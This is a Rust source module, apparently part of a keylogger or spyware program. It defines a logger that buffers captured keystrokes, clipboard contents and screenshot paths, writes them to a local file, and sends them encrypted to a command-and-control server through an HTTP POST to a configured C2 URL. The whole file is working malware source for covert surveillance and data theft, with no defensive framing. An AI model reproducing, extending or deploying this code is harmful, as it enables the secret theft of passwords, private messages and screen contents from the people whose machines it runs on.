use std::fs::OpenOptions;
use std::io::Write;
use std::sync::{Arc, Mutex};
use crate::crypto::encrypt;
use crate::config::{log_file, c2_url};

pub struct Logger {
    pub logs: Arc<Mutex<String>>,
}

impl Logger {
    pub fn new() -> Self {
        Self {
            logs: Arc::new(Mutex::new(String::new())),
        }
    }

    pub fn log_keystroke(&self, key: String) {
        let mut logs = self.logs.lock().unwrap();
        logs.push_str(&key);
    }

    pub fn log_clipboard(&self, content: String) {
        let mut logs = self.logs.lock().unwrap();
        logs.push_str(&format!("\n[CLIPBOARD] {}\n", content));
    }

    pub fn log_screenshot(&self, path: String) {
        let mut logs = self.logs.lock().unwrap();
        logs.push_str(&format!("\n[SCREENSHOT] {}\n", path));
    }

    pub fn flush_to_file(&self) {
        let logs = self.logs.lock().unwrap();
        if !logs.is_empty() {
            let mut file = OpenOptions::new()
                .create(true)
                .append(true)
                .open(log_file())
                .unwrap();
            file.write_all(logs.as_bytes()).unwrap();
        }
    }

    pub async fn send_to_c2(&self) {
        let logs = self.logs.lock().unwrap();
        if !logs.is_empty() {
            let encrypted = encrypt(logs.as_bytes());
            let client = reqwest::Client::new();
            let _ = client.post(c2_url()).body(encrypted).send().await;
        }
    }
}